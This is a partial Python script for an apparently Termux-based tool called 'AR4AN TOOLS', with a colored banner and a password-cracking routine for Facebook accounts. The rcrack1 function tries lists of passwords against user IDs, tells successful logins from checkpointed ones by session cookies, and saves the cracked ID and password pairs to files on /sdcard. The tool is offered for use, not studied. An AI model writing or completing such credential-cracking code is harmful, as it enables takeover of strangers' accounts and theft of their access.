...
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO AR4AN TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[👨‍💻] ASSALAMUALIKUM___🖤🥀
\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
\033[1;32m[-] VERSION   :\033[1;32m 3.0
\033[1;32m[-] AUTHOR    :\033[;32m ARFAN
\033[1;32m[-] GITHUB    :\033[1;32m AR4AN-MUAZ
\033[1;32m[-] FACEBOOK  :\033[1;32m ARFAN MUA Z
\033[1;32m[-] FACEBOOK PAGE :\033[1;32m MUAZ CYBER TEAM
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS AR4AN BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
linex=('\033[1;31m══════════════════════════════════════════')   
#try:
...
#    print("#Your key  : "+key2)
#    print("\n\t\tContact Admin ")
#    os.system('xdg-open https://www.facebook.com/soykotgamer03')
#    exit()
class Main:
    def __init__(self):
        self.id = []
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sAR4AN\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[AR4AN-OK💚] {uid}|{ps}")
                open('/sdcard/AR4AN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               # print(f"\x1b[38;5;196m[AR4AN-CP💔] {uid}|{ps}")
                open('/sdcard/AR4AN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
